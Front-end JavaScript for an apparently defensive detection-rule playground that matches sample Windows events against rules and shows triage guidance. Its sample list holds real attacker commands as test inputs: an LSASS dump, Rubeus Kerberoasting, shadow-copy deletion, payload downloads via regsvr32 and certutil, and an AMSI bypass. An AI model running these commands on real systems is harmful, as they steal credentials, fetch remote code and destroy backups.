import { autoParse, evaluate, explain } from "./engine.js";

const $ = (id) => document.getElementById(id);
const esc = (s) => String(s ?? "").replace(/[&<>"']/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]));
const attackUrl = (t) => `https://attack.mitre.org/techniques/${t.replace(".", "/")}/`;
const TACTICS = ["initial-access", "execution", "persistence", "privilege-escalation", "defense-evasion", "credential-access",
  "discovery", "lateral-movement", "command-and-control", "exfiltration", "impact"];
const SEV_ORDER = { critical: 0, high: 1, medium: 2, low: 3 };

const SAMPLES = [
  { label: "LSASS dump", text: "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Users\\Public\\l.bin full" },
  { label: "Macro runs PowerShell", parent: "winword.exe", text: "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA" },
  { label: "Kerberoasting", text: "Rubeus.exe kerberoast /outfile:hashes.txt" },
  { label: "Shadow copies deleted", text: "vssadmin.exe Delete Shadows /All /Quiet" },
  { label: "Squiblydoo", text: "regsvr32 /s /n /u /i:http://203.0.113.9/f.sct scrobj.dll" },
  { label: "Sysmon XML", text: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System><Provider Name="Microsoft-Windows-Sysmon"/><EventID>1</EventID><Computer>FIN-LAPTOP-07</Computer></System>
  <EventData>
    <Data Name="Image">C:\\Windows\\System32\\certutil.exe</Data>
    <Data Name="CommandLine">certutil -urlcache -split -f http://203.0.113.9/p.exe C:\\Users\\Public\\p.exe</Data>
    <Data Name="ParentImage">C:\\Windows\\System32\\cmd.exe</Data>
    <Data Name="User">CORP\\s.benali</Data>
  </EventData>
</Event>` },
  { label: "Run key (JSON)", text: `{
  "EventID": 13,
  "Image": "C:\\\\Users\\\\amine\\\\AppData\\\\Local\\\\Temp\\\\a.exe",
  "TargetObject": "HKU\\\\S-1-5-21-1\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\Updater",
  "Details": "C:\\\\Users\\\\amine\\\\AppData\\\\Roaming\\\\svc\\\\updater.exe"
}` },
  { label: "Rubeus S4U", text: "Rubeus.exe s4u /user:studvm$ /aes256:8fc5cb090b0c821ac48e539863703bf121b762f9b15a85ab8441be82634c590e /msdsspn:http/mgmtsrv /impersonateuser:techadmin /ptt" },
  { label: "DCSync (4662 XML)", text: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System><Provider Name="Microsoft-Windows-Security-Auditing"/><EventID>4662</EventID><Computer>DC01</Computer></System>
  <EventData>
    <Data Name="SubjectUserName">s.benali</Data>
    <Data Name="ObjectType">%{19195a5b-6da0-11d0-afd3-00c04fd930c9}</Data>
    <Data Name="Properties">%%7688 {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2} {19195a5b-6da0-11d0-afd3-00c04fd930c9}</Data>
  </EventData>
</Event>` },
  { label: "AMSI bypass (4104)", text: `{
  "EventID": 4104,
  "ScriptBlockText": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
}` },
  { label: "PHP2Shell probe (Apache log)", text: "[Thu Oct 22 09:14:02.118262 2026] [php:error] [pid 46981] [client 198.51.100.23:51522] PHP Fatal error:  Allowed memory size of 134217728 bytes exhausted (tried to allocate 65536 bytes) in Unknown on line 0" },
  { label: "Normal admin work", benign: true, text: "powershell.exe Get-Service -Name Spooler | Restart-Service" },
];

let RULES = [];
let FIELDS = {};
let SCENARIO = null;

// ---------------------------------------------------------------- playground

function negatedSelections(node, neg = false, out = new Set()) {
  if ("sel" in node) { if (neg) out.add(node.sel); return out; }
  if ("not" in node) return negatedSelections(node.not, !neg, out);
  const kids = node.and || node.or;
  kids.forEach((k) => negatedSelections(k, neg, out));
  return out;
}

const OP_WORD = { eq: "is", contains: "contains", startswith: "starts with", endswith: "ends with", re: "matches", cidr: "in" };

function whyList(rule, event) {
  const ex = explain(rule, event);
  const negs = negatedSelections(rule.condition);
  const items = [];
  for (const [name, preds] of Object.entries(ex)) {
    const allHit = preds.every((p) => p.hit);
    if (negs.has(name)) {
      if (!allHit) items.push(`<li class="neg"><span>not <b>${esc(name)}</b> (${esc(preds.map((p) => p.field).join(", "))} did not match the exclusion)</span></li>`);
      continue;
    }
    if (!allHit) continue;
    for (const p of preds) {
      const shown = p.op === "re" ? "/" + p.values.join("/, /") + "/" : p.values.slice(0, 4).join(", ") + (p.values.length > 4 ? ", …" : "");
      items.push(`<li><span><b>${esc(p.field)}</b> ${OP_WORD[p.op]}${p.all ? " all of" : p.values.length > 1 ? " one of" : ""} ${esc(shown)}</span></li>`);
    }
  }
  return items.join("");
}

function hitCard(rule, event, idx) {
  const techs = rule.attack.map((t) => `<a class="tech" href="${attackUrl(t)}" target="_blank" rel="noopener">${t}</a>`).join("");
  const id = `h${idx}`;
  return `<article class="hit sev-${rule.severity}">
    <div class="hit-top">
      <div class="hit-meta"><span class="sev ${rule.severity}">${rule.severity}</span><span class="rid">${rule.id}</span>${techs}</div>
      <h3>${esc(rule.title)}</h3>
      <p class="desc">${esc(rule.description)}</p>
      <ul class="why" aria-label="Why it fired">${whyList(rule, event)}</ul>
    </div>
    <div class="tabs" role="tablist">
      <button role="tab" aria-selected="true" data-pane="${id}-triage">Triage</button>
      <button role="tab" aria-selected="false" data-pane="${id}-xql">Cortex XQL</button>
      <button role="tab" aria-selected="false" data-pane="${id}-spl">Splunk SPL</button>
      <button role="tab" aria-selected="false" data-pane="${id}-fp">False positives</button>
    </div>
    <div class="pane" id="${id}-triage"><ol>${rule.triage.map((s) => `<li>${esc(s)}</li>`).join("")}</ol></div>
    <div class="pane" id="${id}-xql" hidden><button class="copy" type="button">Copy</button><pre>${esc(rule.xql)}</pre></div>
    <div class="pane" id="${id}-spl" hidden><button class="copy" type="button">Copy</button><pre>${esc(rule.spl)}</pre></div>
    <div class="pane" id="${id}-fp" hidden><ul>${rule.false_positives.map((s) => `<li>${esc(s)}</li>`).join("")}</ul></div>
  </article>`;
}

function render() {
  const text = $("raw").value;
  const kind = $("kind");
  const hits = $("hits");
  let parsed;
  try {
    parsed = autoParse(text, FIELDS, $("parent").value.trim());
  } catch (e) {
    kind.textContent = "Can't read this";
    kind.className = "chip err";
    hits.innerHTML = `<div class="empty"><b>That input didn't parse.</b>${esc(e.message)}</div>`;
    $("count").textContent = "";
    $("parsed").innerHTML = "";
    return;
  }
  if (!parsed) {
    kind.textContent = "Waiting for input";
    kind.className = "chip";
    hits.innerHTML = `<div class="empty"><b>Nothing to check yet.</b>Type a command line, paste a Sysmon or Windows event, or pick an example on the left.</div>`;
    $("count").textContent = "";
    $("parsed").innerHTML = "";
    return;
  }
  kind.textContent = `${parsed.kind} · ${parsed.logsource.replace(/_/g, " ")}`;
  kind.className = "chip ok";
  $("parsed").innerHTML = Object.entries(parsed.event).map(([k, v]) => `<tr><td>${esc(k)}</td><td>${esc(v)}</td></tr>`).join("");
  const fired = evaluate(RULES, parsed.logsource, parsed.event)
    .sort((a, b) => SEV_ORDER[a.severity] - SEV_ORDER[b.severity] || a.id.localeCompare(b.id));
  const pool = RULES.filter((r) => r.logsource === parsed.logsource).length;
  $("count").textContent = `${fired.length} of ${pool} ${parsed.logsource.replace(/_/g, " ")} rules fired`;
  hits.innerHTML = fired.length
    ? fired.map((r, i) => hitCard(r, parsed.event, i)).join("")
    : `<div class="empty quiet"><b>No detection fired.</b>Either this is normal activity, or you found a gap. If it is an attack, that is a rule worth writing.</div>`;
}

function wireCards() {
  $("hits").addEventListener("click", async (e) => {
    const tab = e.target.closest("[role=tab]");
    if (tab) {
      const card = tab.closest(".hit");
      card.querySelectorAll("[role=tab]").forEach((b) => b.setAttribute("aria-selected", String(b === tab)));
      card.querySelectorAll(".pane").forEach((p) => { p.hidden = p.id !== tab.dataset.pane; });
      return;
    }
    const copy = e.target.closest(".copy");
    if (copy) {
      const text = copy.nextElementSibling.textContent;
      try { await navigator.clipboard.writeText(text); copy.textContent = "Copied"; }
      catch { copy.textContent = "Select and copy"; }
      setTimeout(() => { copy.textContent = "Copy"; }, 1600);
    }
  });
}

function loadInput(text, parent = "") {
  $("raw").value = text;
  $("parent").value = parent;
  render();
}

function buildSamples() {
  $("samples").innerHTML = SAMPLES.map((s, i) =>
    `<button type="button" data-i="${i}"${s.benign ? ' class="benign"' : ""}>${esc(s.label)}</button>`).join("");
  $("samples").addEventListener("click", (e) => {
    const b = e.target.closest("button");
    if (!b) return;
    const s = SAMPLES[Number(b.dataset.i)];
    loadInput(s.text, s.parent || "");
  });
}

// ---------------------------------------------------------------- replay

let pos = -1;
let timer = null;

function stepCommand(ev) {
  return ev["process.command_line"] || [ev["registry.key"], ev["registry.value"]].filter(Boolean).join("\\") +
    (ev["registry.data"] ? `  =  ${ev["registry.data"]}` : "");
}

function buildReplay() {
  $("host").textContent = SCENARIO.host;
  $("timeline").innerHTML = SCENARIO.steps.map((s, i) => `
    <li class="step${s.expect.length ? "" : " quiet"}" data-i="${i}" tabindex="0">
      <time>${esc(s.time)}</time>
      <div>
        <h3>${esc(s.title)}</h3>
        <p>${esc(s.story)}</p>
        <code>${esc(stepCommand(s.event))}</code>
        <div class="fired" id="f${i}"></div>
      </div>
    </li>`).join("");
  const used = TACTICS.filter((t) => RULES.some((r) => r.tactic === t));
  $("board").innerHTML = used.map((t) => `
    <div class="tac" data-t="${t}"><span>${t.replace(/-/g, " ")}</span>
      <div class="cells">${RULES.filter((r) => r.tactic === t).map((r) => `<span class="cell" data-r="${r.id}" title="${esc(r.title)}">${r.id.slice(3)}</span>`).join("")}</div>
    </div>`).join("");
  $("timeline").addEventListener("click", (e) => {
    const li = e.target.closest(".step");
    if (li) { stop(); goTo(Number(li.dataset.i)); }
  });
  $("timeline").addEventListener("keydown", (e) => {
    const li = e.target.closest(".step");
    if (li && (e.key === "Enter" || e.key === " ")) { e.preventDefault(); stop(); goTo(Number(li.dataset.i)); }
  });
  $("btn-play").addEventListener("click", () => (timer ? stop() : play()));
  $("btn-step").addEventListener("click", () => { stop(); goTo(Math.min(pos + 1, SCENARIO.steps.length - 1)); });
  $("btn-reset").addEventListener("click", () => { stop(); goTo(-1); });
  goTo(-1);
}

function goTo(target) {
  pos = target;
  const lit = new Set();
  const tactics = new Set();
  let dets = 0;
  let fp = 0;
  SCENARIO.steps.forEach((s, i) => {
    const li = $("timeline").children[i];
    const box = $(`f${i}`);
    if (i <= pos) {
      const fired = evaluate(RULES, s.logsource, s.event);
      fired.forEach((r) => { lit.add(r.id); tactics.add(r.tactic); });
      dets += fired.length;
      if (!s.expect.length && fired.length) fp += 1;
      box.innerHTML = fired.length ? fired.map((r) => `<span>${r.id} ${esc(r.title)}</span>`).join("")
        : `<span class="none">No alert. Correct, this is normal admin work.</span>`;
      li.classList.add("done");
    } else {
      box.innerHTML = "";
      li.classList.remove("done");
    }
    li.classList.toggle("current", i === pos);
  });
  document.querySelectorAll(".cell").forEach((c) => c.classList.toggle("on", lit.has(c.dataset.r)));
  document.querySelectorAll(".tac").forEach((t) => t.classList.toggle("lit", tactics.has(t.dataset.t)));
  $("m-steps").textContent = `${pos + 1}/${SCENARIO.steps.length}`;
  $("m-dets").textContent = dets;
  $("m-tactics").textContent = tactics.size;
  $("m-fp").textContent = fp;
  $("m-fp").className = fp ? "" : "good";
  if (pos >= 0 && timer) {
    const li = $("timeline").children[pos];
    const r = li.getBoundingClientRect();
    if (r.top < 80 || r.bottom > innerHeight) li.scrollIntoView({ block: "center", behavior: "smooth" });
  }
}

function play() {
  if (pos >= SCENARIO.steps.length - 1) goTo(-1);
  $("btn-play").textContent = "Pause";
  timer = setInterval(() => {
    if (pos >= SCENARIO.steps.length - 1) { stop(); return; }
    goTo(pos + 1);
  }, 1500);
  goTo(pos + 1);
}

function stop() {
  clearInterval(timer);
  timer = null;
  $("btn-play").textContent = pos >= SCENARIO.steps.length - 1 ? "Replay" : "Play";
}

// ---------------------------------------------------------------- coverage

function buildCoverage() {
  const used = TACTICS.filter((t) => RULES.some((r) => r.tactic === t));
  $("cov").innerHTML = used.map((t) => {
    const rs = RULES.filter((r) => r.tactic === t);
    return `<div class="cov-col"><h3>${t.replace(/-/g, " ")} <span>${rs.length}</span></h3>
      ${rs.map((r) => `<button type="button" data-r="${r.id}"><code>${r.id}</code>${esc(r.title)}</button>`).join("")}</div>`;
  }).join("");
  $("cov").addEventListener("click", (e) => {
    const b = e.target.closest("button[data-r]");
    if (!b) return;
    const rule = RULES.find((r) => r.id === b.dataset.r);
    const ev = rule.tests.match[0];
    const text = rule.logsource === "process_creation" && ev["process.command_line"] && Object.keys(ev).every((k) => ["process.name", "process.command_line", "parent.name"].includes(k))
      ? ev["process.command_line"] : JSON.stringify({ logsource: rule.logsource, event: ev }, null, 2);
    loadInput(text, text === ev["process.command_line"] ? ev["parent.name"] || "" : "");
    $("play").scrollIntoView({ behavior: "smooth" });
  });
}

// ---------------------------------------------------------------- boot

async function boot() {
  const [lib, scen] = await Promise.all([fetch("data/rules.json").then((r) => r.json()), fetch("data/scenario.json").then((r) => r.json())]);
  RULES = lib.rules;
  FIELDS = Object.fromEntries(Object.entries(lib.logsources).map(([k, v]) => [k, v.fields]));
  SCENARIO = scen;
  $("n-rules").textContent = RULES.length;
  buildSamples();
  wireCards();
  buildReplay();
  buildCoverage();
  let t;
  const later = () => { clearTimeout(t); t = setTimeout(render, 120); };
  $("raw").addEventListener("input", later);
  $("parent").addEventListener("input", later);
  loadInput(SAMPLES[0].text);
}

boot().catch((e) => {
  $("hits").innerHTML = `<div class="empty"><b>The rules did not load.</b>${esc(e.message)}</div>`;
});
